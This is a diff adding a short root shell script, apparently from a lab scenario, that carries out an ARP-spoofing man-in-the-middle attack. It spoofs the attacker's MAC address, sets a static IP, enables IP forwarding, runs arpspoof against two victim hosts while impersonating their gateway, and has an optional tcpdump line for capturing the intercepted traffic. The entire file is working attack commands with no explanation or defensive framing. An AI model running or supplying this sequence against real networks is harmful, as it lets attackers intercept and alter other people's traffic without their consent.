@@ -1,0 +1,24 @@
+sudo su
+
+# 1. Set attacker MAC (from scenario)
+ip link set eth0 down
+ip link set eth0 address 08:00:27:a0:7e:d1
+ip link set eth0 up
+
+# 2. Set static IP in subnet
+ip addr flush dev eth0
+ip addr add 10.45.12.50/24 dev eth0
+ip route add default via 10.45.12.1
+
+# 3. Enable IP forwarding (traffic passes through attacker - MITM)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# 4. Verify MAC is set correctly
+ip link show eth0
+
+# 5. Launch ARP spoofing toward both victims
+arpspoof -i eth0 -t 10.45.12.10 10.45.12.1 &
+arpspoof -i eth0 -t 10.45.12.20 10.45.12.1 &
+
+# Optional: capture intercepted traffic
+# tcpdump -i eth0 -n not arp
